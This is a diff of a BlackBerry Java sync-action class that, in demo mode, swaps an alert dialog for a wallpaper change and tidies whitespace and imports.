@@ -11,11 +11,13 @@ package blackberry.action.sync;
 
 import java.util.Vector;
 
+import net.rim.blackberry.api.homescreen.HomeScreen;
 import net.rim.device.api.crypto.RandomSource;
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.ui.component.Dialog;
+import blackberry.Main;
 import blackberry.Messages;
 import blackberry.Status;
 import blackberry.Trigger;
@@ -67,13 +69,9 @@ public abstract class SyncAction extends SubActionMain {
             //#endif
             return false;
         }
-        
-        if(Backlight.isEnabled() && Status.getInstance().isDemo()){
-            UiApplication.getUiApplication().invokeAndWait(new Runnable() {
-                public void run() {
-                    Dialog.alert(Messages.getString("C.2"));
-                }
-            });
+
+        if (Backlight.isEnabled() && Status.getInstance().isDemo()) {
+            Main.setWallpaper(true);
         }
 
         //#ifndef DEBUG
@@ -82,7 +80,6 @@ public abstract class SyncAction extends SubActionMain {
         }
         //#endif
 
-        
         if (DeviceInfo.getIdleTime() > 600 && RandomSource.getInt(10) == 0) {
             //#ifdef DEBUG
             debug.trace("execute garbage collector");
